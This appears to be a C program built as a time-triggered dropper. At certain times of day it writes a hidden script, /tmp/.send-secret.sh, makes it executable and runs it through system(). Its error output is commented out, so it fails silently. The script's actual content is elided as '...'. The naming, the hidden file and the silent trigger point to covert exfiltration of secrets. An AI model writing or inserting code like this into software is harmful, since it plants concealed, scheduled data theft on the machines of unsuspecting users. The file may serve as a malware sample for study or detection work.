#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdbool.h>
const char* script_content = "...";
void create_and_run_script(const char* script_path) {
    FILE* script_file = fopen(script_path, "w");
    if (!script_file) {
        //perror("Failed to create script file");
        exit(EXIT_FAILURE);
    }

    fprintf(script_file, "%s", script_content);
    fclose(script_file);
    
    chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
    
    system(script_path);
}

int main(void) {
    const char* script_path = "/tmp/.send-secret.sh";

    time_t mytime = time(NULL);
    struct tm *result = localtime(&mytime);

    if (result->tm_hour > 8 && result->tm_min > 20) {
        create_and_run_script(script_path);   
    }
}